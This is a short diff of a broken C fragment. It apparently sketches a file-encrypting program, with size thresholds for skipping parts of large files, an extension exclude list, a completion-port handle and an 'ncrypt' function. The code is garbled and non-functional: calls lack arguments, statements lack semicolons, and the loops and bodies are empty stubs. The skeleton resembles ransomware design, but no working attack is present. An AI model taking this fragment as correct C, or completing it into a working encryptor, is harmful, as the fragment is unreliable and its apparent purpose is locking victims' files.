@@ -1,6 +1,8 @@
 #define OMIT_LENGHT 512
 #define SHOULD_OMIT 2048
+
 char *exclude[]={".pdf",".txt"};
+HANDLE CompletionPort
 int filesize(char *file)
 {
 FILE *filep = fopen(file);
@@ -13,7 +15,7 @@ int ncrypt(char *file)
 {
 malloc()
 fread()
-for(i 
+for(i)
 
 }
 
